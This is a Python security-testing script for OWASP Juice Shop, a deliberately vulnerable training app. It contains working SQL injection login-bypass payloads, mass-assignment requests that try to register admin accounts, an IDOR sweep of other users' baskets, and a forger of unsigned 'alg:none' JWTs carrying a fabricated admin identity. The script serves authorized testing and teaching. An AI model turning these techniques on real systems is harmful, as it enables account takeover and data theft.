#!/usr/bin/env python3
"""
juice_shop_security_tester.py  (v2)

Automated security testing tool for OWASP Juice Shop.

Attack points (v2 - revised for methodological depth over breadth):
  1. Authentication - SQL injection login bypass, WITH negative-control
     verification (a payload engineered to fail is sent alongside every
     positive payload; a finding is only confirmed if the positive succeeds
     AND the negative control still fails).                 -> SQLiAuthBypassTest

  2. API input trust - Mass Assignment on registration
     (does /api/Users/ bind client-supplied privileged fields such as
     'role' to the stored user object, verified via a real before/after
     /rest/user/whoami comparison).                          -> MassAssignmentTest

  3. Authorization & token integrity (merged IDOR + JWT manipulation):
       Phase 1 - standard IDOR sweep of /rest/basket/{id} with a
                 legitimately-issued token (object-level authz check).
       Phase 2 - JWT signature-integrity test: the same token is decoded,
                 an 'alg:none' variant with a FABRICATED identity that was
                 never registered is forged, and replayed against
                 /rest/user/whoami and /rest/basket/{id}. Success proves
                 the server trusts unsigned, attacker-chosen tokens without
                 requiring any real account at all.           -> AuthzTokenIntegrityTest

Findings from all three feed a final correlation pass that reports combined,
compounded risk (e.g. "IDOR + working alg:none bypass means authorization
can be defeated with ZERO valid credentials").

IMPORTANT: Only run this against a Juice Shop instance you own or are
explicitly authorized to test.
"""

import argparse
import base64
import dataclasses
import datetime
import json
import logging
import sys
import time
import uuid
from typing import Any, Dict, List, Optional, Tuple

import requests
from requests.exceptions import RequestException, Timeout, ConnectionError as ReqConnectionError

# --------------------------------------------------------------------------- #
# Shared data model
# --------------------------------------------------------------------------- #

SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


@dataclasses.dataclass
class Finding:
    attack_point: str
    test_name: str
    severity: str
    description: str
    evidence: Dict[str, Any]
    request_summary: str
    timestamp: str = dataclasses.field(
        default_factory=lambda: datetime.datetime.now(datetime.timezone.utc).isoformat()
    )

    def to_dict(self) -> Dict[str, Any]:
        return dataclasses.asdict(self)


def decode_jwt_payload(token: str) -> Optional[Dict[str, Any]]:
    """
    Shared helper: decode a JWT's payload segment without verifying the
    signature (we only need to read claims here, never to trust them for
    access). Returns None if the token isn't a well-formed 3-part JWT.
    """
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        payload_b64 = parts[1]
        padding = "=" * (-len(payload_b64) % 4)
        return json.loads(base64.urlsafe_b64decode(payload_b64 + padding))
    except Exception:
        return None


def setup_logger(verbose: bool) -> logging.Logger:
    logger = logging.getLogger("juice_shop_tester")
    logger.setLevel(logging.DEBUG if verbose else logging.INFO)
    handler = logging.StreamHandler(sys.stdout)
    handler.setFormatter(logging.Formatter("[%(asctime)s] %(levelname)-8s %(message)s",
                                            datefmt="%H:%M:%S"))
    logger.handlers = [handler]
    return logger


# --------------------------------------------------------------------------- #
# Base class
# --------------------------------------------------------------------------- #

class BaseAttackModule:
    attack_point_name = "base"

    def __init__(self, base_url: str, session: requests.Session,
                 logger: logging.Logger, timeout: float = 8.0, delay: float = 0.3):
        self.base_url = base_url.rstrip("/")
        self.session = session
        self.logger = logger
        self.timeout = timeout
        self.delay = delay
        self.findings: List[Finding] = []

    def _request(self, method: str, path: str, max_retries: int = 2, **kwargs) -> Optional[requests.Response]:
        url = f"{self.base_url}{path}"
        attempt = 0
        backoff = 0.5
        while attempt <= max_retries:
            try:
                resp = self.session.request(method, url, timeout=self.timeout, **kwargs)
                time.sleep(self.delay)
                return resp
            except Timeout:
                self.logger.warning(f"[{self.attack_point_name}] Timeout on {method} {url} "
                                     f"(attempt {attempt + 1}/{max_retries + 1})")
            except ReqConnectionError:
                self.logger.error(f"[{self.attack_point_name}] Connection error on {method} {url} "
                                   f"(attempt {attempt + 1}/{max_retries + 1})")
            except RequestException as exc:
                self.logger.error(f"[{self.attack_point_name}] Unexpected request error: {exc}")
                return None
            attempt += 1
            if attempt <= max_retries:
                time.sleep(backoff)
                backoff *= 2
        self.logger.error(f"[{self.attack_point_name}] Giving up on {method} {url} after retries")
        return None

    def add_finding(self, test_name: str, severity: str, description: str,
                     evidence: Dict[str, Any], request_summary: str):
        finding = Finding(
            attack_point=self.attack_point_name, test_name=test_name, severity=severity,
            description=description, evidence=evidence, request_summary=request_summary,
        )
        self.findings.append(finding)
        self.logger.info(f"[{self.attack_point_name}] FINDING ({severity}): {test_name} - {description}")

    def run(self) -> List[Finding]:
        raise NotImplementedError


# --------------------------------------------------------------------------- #
# Attack point 1: SQL injection login bypass WITH negative-control verification
# --------------------------------------------------------------------------- #

class SQLiAuthBypassTest(BaseAttackModule):
    """
    Methodology upgrade over v1: every positive (tautology) payload is paired
    with a negative-control payload of the same shape but engineered to
    evaluate false (e.g. '... AND 1=2--'). A bypass is only reported as
    CONFIRMED if:
      (a) the positive payload returns HTTP 200 with an auth token, AND
      (b) the matched negative control still returns 401/400.
    This rules out an endpoint that is simply misbehaving (e.g. accepting
    any input) rather than genuinely vulnerable to injection logic.
    """

    attack_point_name = "authentication (/rest/user/login)"

    PAYLOAD_PAIRS: List[Tuple[str, str]] = [
        ("' OR 1=1--",              "' AND 1=2--"),
        ("' OR '1'='1",             "' AND '1'='2"),
        ("admin'--",                "nonexistent_admin_zzz'--"),
        ("' OR 1=1#",               "' AND 1=2#"),
        ("x' OR 'a'='a' LIMIT 1--", "x' AND 'a'='b' LIMIT 1--"),
    ]

    def _looks_authenticated(self, resp: requests.Response) -> bool:
        if resp.status_code != 200:
            return False
        try:
            return "authentication" in resp.json()
        except ValueError:
            return "authentication" in resp.text.lower()

    def run(self) -> List[Finding]:
        self.logger.info(f"Starting authentication tests against {self.base_url}/rest/user/login")

        for positive, negative in self.PAYLOAD_PAIRS:
            pos_resp = self._request("POST", "/rest/user/login",
                                      json={"email": positive, "password": "irrelevant_123"})
            neg_resp = self._request("POST", "/rest/user/login",
                                      json={"email": negative, "password": "irrelevant_123"})
            if pos_resp is None or neg_resp is None:
                continue

            positive_hit = self._looks_authenticated(pos_resp)
            negative_still_fails = not self._looks_authenticated(neg_resp)

            if positive_hit and negative_still_fails:
                self.add_finding(
                    test_name="SQL injection authentication bypass (confirmed w/ negative control)",
                    severity="critical",
                    description=(
                        f"Payload {positive!r} authenticated successfully (HTTP 200 + token) while "
                        f"the structurally-matched negative control {negative!r} was correctly "
                        f"rejected. This rules out a generally-broken endpoint and confirms the "
                        f"difference in outcome is driven by SQL truth-value injection, i.e. the "
                        f"login query is unparameterized."
                    ),
                    evidence={"positive_payload": positive, "negative_control": negative,
                              "positive_status": pos_resp.status_code, "negative_status": neg_resp.status_code,
                              "positive_response_snippet": pos_resp.text[:200]},
                    request_summary=f"POST /rest/user/login paired test: {positive!r} vs {negative!r}",
                )
            elif positive_hit and not negative_still_fails:
                self.add_finding(
                    test_name="Inconclusive authentication anomaly",
                    severity="low",
                    description=(
                        f"Payload {positive!r} authenticated successfully, but negative control "
                        f"{negative!r} ALSO authenticated. This suggests the endpoint may be "
                        f"broadly accepting malformed input rather than being vulnerable to "
                        f"truth-value injection specifically - flagged for manual review."
                    ),
                    evidence={"positive_status": pos_resp.status_code, "negative_status": neg_resp.status_code},
                    request_summary=f"POST /rest/user/login paired test: {positive!r} vs {negative!r}",
                )
            elif pos_resp.status_code == 500 or neg_resp.status_code == 500:
                self.add_finding(
                    test_name="Unhandled server error on SQLi-shaped input",
                    severity="medium",
                    description=(
                        f"Payload pair ({positive!r} / {negative!r}) produced an HTTP 500 rather than "
                        f"a clean 401/400. A 500 on malicious-shaped input often indicates an "
                        f"unhandled exception in query construction and merits manual follow-up "
                        f"even though no bypass was confirmed automatically."
                    ),
                    evidence={"positive_status": pos_resp.status_code, "negative_status": neg_resp.status_code},
                    request_summary=f"POST /rest/user/login paired test: {positive!r} vs {negative!r}",
                )

        attempts = 10
        normal_responses = 0
        timings = []
        for i in range(attempts):
            t0 = time.time()
            resp = self._request("POST", "/rest/user/login",
                                  json={"email": "rl_probe@example.com", "password": f"wrong{i}"})
            if resp is not None:
                timings.append(time.time() - t0)
                if resp.status_code in (400, 401):
                    normal_responses += 1

        if timings:
            avg_early = sum(timings[:3]) / min(3, len(timings))
            avg_late = sum(timings[-3:]) / min(3, len(timings))
            timing_delta_pct = ((avg_late - avg_early) / avg_early * 100) if avg_early > 0 else 0.0
        else:
            avg_early = avg_late = timing_delta_pct = 0.0

        if normal_responses >= attempts - 1 and abs(timing_delta_pct) < 25:
            self.add_finding(
                test_name="Missing login rate limiting (quantitatively confirmed)",
                severity="medium",
                description=(
                    f"{normal_responses}/{attempts} consecutive failed attempts processed with no "
                    f"lockout. Response latency showed no meaningful increase across the burst "
                    f"(avg first-3={avg_early:.3f}s vs avg last-3={avg_late:.3f}s, "
                    f"delta={timing_delta_pct:.1f}%), confirming there is no throttling delay being "
                    f"applied, not just no hard lockout."
                ),
                evidence={"attempts": attempts, "normal_responses": normal_responses,
                          "avg_latency_first_3": round(avg_early, 3), "avg_latency_last_3": round(avg_late, 3),
                          "timing_delta_pct": round(timing_delta_pct, 1)},
                request_summary=f"{attempts}x POST /rest/user/login (timed burst)",
            )

        self.logger.info("Authentication tests complete.")
        return self.findings


# --------------------------------------------------------------------------- #
# Attack point 2: Mass Assignment on registration
# --------------------------------------------------------------------------- #

class MassAssignmentTest(BaseAttackModule):
    """
    Methodology: register a BASELINE account with only the fields the UI
    exposes, then register separate TEST accounts each adding one extra,
    unexposed field (role / isAdmin / admin / permissions). Log in as each
    and call /rest/user/whoami. A finding is only confirmed via a real
    before/after comparison against the baseline account's whoami response -
    not by assuming the field worked just because registration returned 200.
    """

    attack_point_name = "api input trust (/api/Users/ mass assignment)"

    CANDIDATE_FIELDS = [
        {"role": "admin"},
        {"isAdmin": True},
        {"admin": True},
        {"permissions": ["admin"]},
    ]

    def _unique_email(self, tag: str) -> str:
        return f"mass_{tag}_{uuid.uuid4().hex[:8]}@example.com"

    def _register_login_get_role(self, email: str, password: str,
                                  extra_fields: Optional[Dict[str, Any]] = None) -> Tuple[Optional[str], Dict[str, Any]]:
        """
        Register, log in, and return (role, debug_info). The role is read
        from the JWT's 'data' claim, NOT from /rest/user/whoami - whoami
        only echoes back {id, email} and does not include role, so it
        cannot be used to verify or refute this finding either way.
        """
        debug_info: Dict[str, Any] = {}
        body = {
            "email": email, "password": password, "passwordRepeat": password,
            "securityQuestion": {"id": 1, "question": "placeholder"},
            "securityAnswer": "placeholder",
        }
        if extra_fields:
            body.update(extra_fields)

        reg_resp = self._request("POST", "/api/Users/", json=body)
        debug_info["registration_status"] = reg_resp.status_code if reg_resp else None
        if reg_resp is None or reg_resp.status_code not in (200, 201):
            debug_info["registration_body"] = reg_resp.text[:200] if reg_resp is not None else None
            return None, debug_info

        # The registration response itself may already echo the created
        # user object - capture it as a first, pre-login signal.
        try:
            reg_json = reg_resp.json()
            debug_info["registration_response_role"] = reg_json.get("data", reg_json).get("role")
        except ValueError:
            pass

        login_resp = self._request("POST", "/rest/user/login", json={"email": email, "password": password})
        debug_info["login_status"] = login_resp.status_code if login_resp else None
        if login_resp is None or login_resp.status_code != 200:
            return None, debug_info
        try:
            token = login_resp.json()["authentication"]["token"]
        except (ValueError, KeyError):
            return None, debug_info

        payload = decode_jwt_payload(token)
        if payload is None:
            debug_info["jwt_decode_failed"] = True
            return None, debug_info

        role = payload.get("data", payload).get("role")
        debug_info["jwt_role_claim"] = role
        return role, debug_info

    def run(self) -> List[Finding]:
        self.logger.info("Starting mass assignment tests against /api/Users/")

        baseline_role, baseline_debug = self._register_login_get_role(self._unique_email("baseline"), "MassTest!2026")
        if baseline_role is None and not baseline_debug.get("login_status"):
            self.logger.error("Mass assignment test: could not establish a baseline account, aborting module.")
            return self.findings

        self.logger.info(f"Baseline role (from JWT claim) for a normally-registered account: {baseline_role!r}")

        for extra_fields in self.CANDIDATE_FIELDS:
            field_name = list(extra_fields.keys())[0]
            email = self._unique_email(field_name)
            result_role, result_debug = self._register_login_get_role(email, "MassTest!2026", extra_fields)
            request_summary = f"POST /api/Users/ with extra field {extra_fields}"
            self.logger.debug(f"Field {field_name!r} debug: {result_debug}")

            if result_role is None and not result_debug.get("login_status"):
                self.logger.debug(f"Field {field_name!r}: registration/login chain failed, skipping ({result_debug}).")
                continue

            if result_role is not None and result_role != baseline_role and str(result_role).lower() in (
                    "admin", "administrator"):
                self.add_finding(
                    test_name=f"Mass assignment - privilege escalation via '{field_name}' field",
                    severity="critical",
                    description=(
                        f"Registering with the unexposed field {extra_fields} produced an account "
                        f"whose JWT 'data.role' claim (read directly from the issued token, since "
                        f"/rest/user/whoami does not expose role) is {result_role!r}, versus "
                        f"{baseline_role!r} for a normally-registered baseline account. The "
                        f"registration endpoint is binding client-supplied privileged fields "
                        f"directly to the stored user model without a field whitelist."
                    ),
                    evidence={"field_tested": extra_fields, "baseline_role": baseline_role,
                              "resulting_role": result_role, "test_account_email": email,
                              "debug": result_debug},
                    request_summary=request_summary,
                )
            elif result_role != baseline_role:
                self.add_finding(
                    test_name=f"Mass assignment - unexpected field acceptance ('{field_name}')",
                    severity="medium",
                    description=(
                        f"Field {extra_fields} produced a role value {result_role!r} different from "
                        f"baseline {baseline_role!r}, but not a recognized privileged role string - "
                        f"flagged for manual review rather than auto-confirmed as privilege escalation."
                    ),
                    evidence={"field_tested": extra_fields, "baseline_role": baseline_role,
                              "resulting_role": result_role, "test_account_email": email,
                              "debug": result_debug},
                    request_summary=request_summary,
                )
            else:
                self.logger.debug(f"Field {field_name!r}: no effect observed (role stayed {result_role!r}, "
                                   f"debug={result_debug}).")

        self.logger.info("Mass assignment tests complete.")
        return self.findings


# --------------------------------------------------------------------------- #
# Attack point 3: Authorization & token integrity (IDOR + JWT, merged)
# --------------------------------------------------------------------------- #

class AuthzTokenIntegrityTest(BaseAttackModule):
    """
    Phase 1 (IDOR): legitimate account, sweep adjacent basket IDs, report
    a single AGGREGATED finding with a computed exposure rate rather than
    one finding per ID (so severity reflects measured impact, not raw
    event count).

    Phase 2 (JWT integrity): decode the legitimate token, forge an
    'alg:none' token carrying a FABRICATED identity that was never
    registered anywhere, and replay it against /rest/user/whoami and
    /rest/basket/{id}. Success proves authorization can be defeated with
    *zero* valid credentials - a materially worse finding than Phase 1
    alone, which still required a real (if low-privilege) account.
    """

    attack_point_name = "authorization & token integrity (IDOR + JWT)"

    def __init__(self, *args, test_email: str, test_password: str, id_range: int = 5, **kwargs):
        super().__init__(*args, **kwargs)
        self.test_email = test_email
        self.test_password = test_password
        self.id_range = id_range
        self.idor_exposure_rate: Optional[float] = None
        self.jwt_bypass_confirmed = False

    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    @staticmethod
    def _b64url_decode(s: str) -> bytes:
        padding = "=" * (-len(s) % 4)
        return base64.urlsafe_b64decode(s + padding)

    def _decode_jwt(self, token: str) -> Optional[Tuple[Dict[str, Any], Dict[str, Any]]]:
        try:
            header_b64, payload_b64, _sig = token.split(".")
            header = json.loads(self._b64url_decode(header_b64))
            payload = json.loads(self._b64url_decode(payload_b64))
            return header, payload
        except Exception as exc:
            self.logger.error(f"Could not decode JWT: {exc}")
            return None

    def _forge_alg_none_token(self, original_payload: Dict[str, Any],
                               fabricated_identity: Dict[str, Any]) -> str:
        header = {"alg": "none", "typ": "JWT"}
        payload = dict(original_payload)
        if "data" in payload and isinstance(payload["data"], dict):
            payload["data"].update(fabricated_identity)
        else:
            payload.update(fabricated_identity)
        header_b64 = self._b64url_encode(json.dumps(header).encode())
        payload_b64 = self._b64url_encode(json.dumps(payload).encode())
        return f"{header_b64}.{payload_b64}."

    def _register_and_login(self) -> Optional[Dict[str, Any]]:
        reg_body = {
            "email": self.test_email, "password": self.test_password,
            "passwordRepeat": self.test_password,
            "securityQuestion": {"id": 1, "question": "placeholder"},
            "securityAnswer": "placeholder",
        }
        self._request("POST", "/api/Users/", json=reg_body)
        login_resp = self._request("POST", "/rest/user/login",
                                     json={"email": self.test_email, "password": self.test_password})
        if login_resp is None or login_resp.status_code != 200:
            self.logger.error("Could not authenticate test account for authz/JWT module, skipping.")
            return None
        try:
            return login_resp.json()
        except ValueError:
            return None

    def _phase1_idor(self, token: str, own_basket_id: int):
        headers = {"Authorization": f"Bearer {token}"}
        candidate_ids = [i for i in range(max(1, own_basket_id - self.id_range),
                                           own_basket_id + self.id_range + 1)
                          if i != own_basket_id]
        exposed, checked, sample_evidence = [], 0, None

        for bid in candidate_ids:
            resp = self._request("GET", f"/rest/basket/{bid}", headers=headers)
            if resp is None:
                continue
            checked += 1
            if resp.status_code == 200:
                exposed.append(bid)
                if sample_evidence is None:
                    sample_evidence = resp.text[:250]

        self.idor_exposure_rate = (len(exposed) / checked) if checked else 0.0

        if exposed:
            if self.idor_exposure_rate >= 0.8:
                severity = "high"
            elif self.idor_exposure_rate >= 0.3:
                severity = "medium"
            else:
                severity = "low"
            self.add_finding(
                test_name="IDOR: basket ownership not enforced",
                severity=severity,
                description=(
                    f"{len(exposed)}/{checked} adjacent basket IDs ({exposed}) were accessible "
                    f"using only the test account's own token, for a measured exposure rate of "
                    f"{self.idor_exposure_rate * 100:.0f}% across the sampled ID range. Severity is "
                    f"computed from this measured rate rather than fixed per-finding."
                ),
                evidence={"own_basket_id": own_basket_id, "checked_ids": checked,
                          "exposed_ids": exposed, "exposure_rate": round(self.idor_exposure_rate, 2),
                          "sample_response_snippet": sample_evidence},
                request_summary=f"GET /rest/basket/{{id}} x{checked} (own token, adjacent ID sweep)",
            )
        else:
            self.add_finding(
                test_name="Basket ownership enforcement observed",
                severity="info",
                description=f"0/{checked} adjacent basket IDs were accessible with the test account's token.",
                evidence={"own_basket_id": own_basket_id, "checked_ids": checked},
                request_summary=f"GET /rest/basket/{{id}} x{checked} (own token, adjacent ID sweep)",
            )

    def _phase2_jwt(self, token: str, own_basket_id: int):
        decoded = self._decode_jwt(token)
        if decoded is None:
            self.logger.error("Phase 2 skipped: could not decode the legitimate JWT.")
            return
        _header, payload = decoded

        fabricated = {
            "id": 999999,
            "email": f"fabricated_{uuid.uuid4().hex[:8]}@never-registered.invalid",
            "role": "admin",
        }
        forged_token = self._forge_alg_none_token(payload, fabricated)
        forged_headers = {"Authorization": f"Bearer {forged_token}"}

        whoami_resp = self._request("GET", "/rest/user/whoami", headers=forged_headers)
        whoami_accepted = (whoami_resp is not None and whoami_resp.status_code == 200
                            and fabricated["email"] in (whoami_resp.text or ""))

        basket_resp = self._request("GET", f"/rest/basket/{own_basket_id}", headers=forged_headers)
        basket_accepted = basket_resp is not None and basket_resp.status_code == 200

        if whoami_accepted or basket_accepted:
            self.jwt_bypass_confirmed = True
            self.add_finding(
                test_name="JWT signature not validated (alg:none bypass, fabricated identity)",
                severity="critical",
                description=(
                    f"A forged 'alg:none' token with NO signature, carrying a fabricated identity "
                    f"({fabricated['email']}) that was never registered on this instance, was "
                    f"accepted by the server: "
                    f"whoami_accepted={whoami_accepted}, basket_accepted={basket_accepted}. "
                    f"This means the server does not validate JWT signatures or restrict the "
                    f"accepted algorithm, so authorization can be defeated with ZERO valid "
                    f"credentials - not even a throwaway registered account is required."
                ),
                evidence={"fabricated_identity": fabricated,
                          "whoami_status": whoami_resp.status_code if whoami_resp else None,
                          "whoami_accepted": whoami_accepted,
                          "basket_status": basket_resp.status_code if basket_resp else None,
                          "basket_accepted": basket_accepted,
                          "forged_token_preview": forged_token[:80] + "..."},
                request_summary="GET /rest/user/whoami and /rest/basket/{id} with forged alg:none token",
            )
        else:
            self.add_finding(
                test_name="JWT signature validation enforced",
                severity="info",
                description="Forged alg:none token with a fabricated identity was correctly rejected.",
                evidence={"whoami_status": whoami_resp.status_code if whoami_resp else None,
                          "basket_status": basket_resp.status_code if basket_resp else None},
                request_summary="GET /rest/user/whoami and /rest/basket/{id} with forged alg:none token",
            )

    def run(self) -> List[Finding]:
        self.logger.info("Starting authorization & token integrity tests (IDOR + JWT)")
        auth_data = self._register_and_login()
        if auth_data is None:
            return self.findings

        token = auth_data.get("authentication", {}).get("token")
        own_basket_id = auth_data.get("authentication", {}).get("bid") or 1
        if not token:
            self.logger.error("No token returned at login, skipping module.")
            return self.findings

        self.logger.info(f"Authenticated as {self.test_email}; own basket id = {own_basket_id}")
        self._phase1_idor(token, own_basket_id)
        self._phase2_jwt(token, own_basket_id)
        self.logger.info("Authorization & token integrity tests complete.")
        return self.findings


# --------------------------------------------------------------------------- #
# Cross-module correlation
# --------------------------------------------------------------------------- #

def correlate_findings(all_findings: List[Finding], mass_assignment_hit: bool,
                        idor_rate: Optional[float], jwt_bypass: bool) -> List[Finding]:
    correlated: List[Finding] = []

    if idor_rate is not None and idor_rate > 0 and jwt_bypass:
        correlated.append(Finding(
            attack_point="correlation",
            test_name="Compounded authorization failure: IDOR + unsigned-token acceptance",
            severity="critical",
            description=(
                f"Basket objects are not ownership-checked (measured {idor_rate * 100:.0f}% exposure "
                f"rate) AND the server accepts forged, unsigned JWTs with a fabricated identity. "
                f"Combined, this means an attacker needs NEITHER a legitimate account NOR correct "
                f"object ownership to read arbitrary basket data - the two individually-'high' "
                f"findings compound into a full authorization bypass reachable by an anonymous "
                f"attacker with no prior interaction with the application."
            ),
            evidence={"idor_exposure_rate": round(idor_rate, 2), "jwt_bypass_confirmed": jwt_bypass},
            request_summary="Synthesis of Phase 1 (IDOR sweep) + Phase 2 (JWT forgery) results",
        ))

    if mass_assignment_hit and jwt_bypass:
        correlated.append(Finding(
            attack_point="correlation",
            test_name="Compounded privilege failure: mass assignment + unsigned-token acceptance",
            severity="critical",
            description=(
                "The registration endpoint accepts a client-supplied privileged role AND the "
                "server accepts unsigned, forged tokens. Even without the mass-assignment path, "
                "an attacker can forge an 'admin' identity directly via alg:none and skip "
                "registration entirely - the mass-assignment finding demonstrates the privilege "
                "model is not enforced in a second, independent way."
            ),
            evidence={"mass_assignment_confirmed": mass_assignment_hit, "jwt_bypass_confirmed": jwt_bypass},
            request_summary="Synthesis of Mass Assignment module + JWT forgery (Phase 2) results",
        ))

    return correlated


# --------------------------------------------------------------------------- #
# Orchestration / reporting
# --------------------------------------------------------------------------- #

def build_report(target: str, all_findings: List[Finding], modules_run: List[str]) -> Dict[str, Any]:
    findings_sorted = sorted(all_findings, key=lambda f: SEVERITY_ORDER.get(f.severity, 99))
    severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for f in all_findings:
        severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1
    return {
        "target": target,
        "scan_timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "modules_run": modules_run,
        "severity_counts": severity_counts,
        "total_findings": len(all_findings),
        "findings": [f.to_dict() for f in findings_sorted],
    }


def print_console_summary(report: Dict[str, Any], logger: logging.Logger):
    logger.info("=" * 72)
    logger.info("SCAN SUMMARY")
    logger.info("=" * 72)
    logger.info(f"Target: {report['target']}")
    logger.info(f"Modules run: {', '.join(report['modules_run'])}")
    sc = report['severity_counts']
    logger.info(f"Total findings: {report['total_findings']}  "
                f"(critical={sc['critical']}, high={sc['high']}, medium={sc['medium']}, "
                f"low={sc['low']}, info={sc['info']})")
    logger.info("-" * 72)
    for f in report["findings"]:
        logger.info(f"[{f['severity'].upper():8}] {f['attack_point']} :: {f['test_name']}")
    logger.info("=" * 72)


def main():
    parser = argparse.ArgumentParser(
        description="Automated attack-point testing tool for an authorized OWASP Juice Shop instance (v2)."
    )
    parser.add_argument("--target", default="http://localhost:3000")
    parser.add_argument("--output", default="report.json")
    parser.add_argument("--timeout", type=float, default=8.0)
    parser.add_argument("--delay", type=float, default=0.3)
    parser.add_argument("--modules", default="sqli,massassign,authz",
                         help="Comma-separated: sqli,massassign,authz")
    parser.add_argument("--test-email", default="pentest_tool_user@example.com")
    parser.add_argument("--test-password", default="PentestTool!2026")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    logger = setup_logger(args.verbose)
    logger.warning("Only run this tool against a Juice Shop instance you own or are explicitly authorized to test.")

    session = requests.Session()
    session.headers.update({"User-Agent": "JuiceShopSecurityTester/2.0 (authorized-testing)"})

    requested = [m.strip().lower() for m in args.modules.split(",") if m.strip()]
    all_findings: List[Finding] = []
    modules_run: List[str] = []
    mass_assignment_hit = False
    idor_rate = None
    jwt_bypass = False

    try:
        probe = session.get(args.target, timeout=args.timeout)
        logger.info(f"Target reachable, root responded with HTTP {probe.status_code}")
    except RequestException as exc:
        logger.error(f"Could not reach target {args.target}: {exc}")
        sys.exit(1)

    if "sqli" in requested:
        mod = SQLiAuthBypassTest(args.target, session, logger, args.timeout, args.delay)
        all_findings.extend(mod.run())
        modules_run.append("sqli")

    if "massassign" in requested:
        mod = MassAssignmentTest(args.target, session, logger, args.timeout, args.delay)
        results = mod.run()
        all_findings.extend(results)
        mass_assignment_hit = any(f.severity == "critical" for f in results)
        modules_run.append("massassign")

    if "authz" in requested:
        mod = AuthzTokenIntegrityTest(args.target, session, logger, args.timeout, args.delay,
                                        test_email=args.test_email, test_password=args.test_password)
        all_findings.extend(mod.run())
        idor_rate = mod.idor_exposure_rate
        jwt_bypass = mod.jwt_bypass_confirmed
        modules_run.append("authz")

    all_findings.extend(correlate_findings(all_findings, mass_assignment_hit, idor_rate, jwt_bypass))

    report = build_report(args.target, all_findings, modules_run)
    print_console_summary(report, logger)

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info(f"Full JSON report written to {args.output}")


if __name__ == "__main__":
    main()
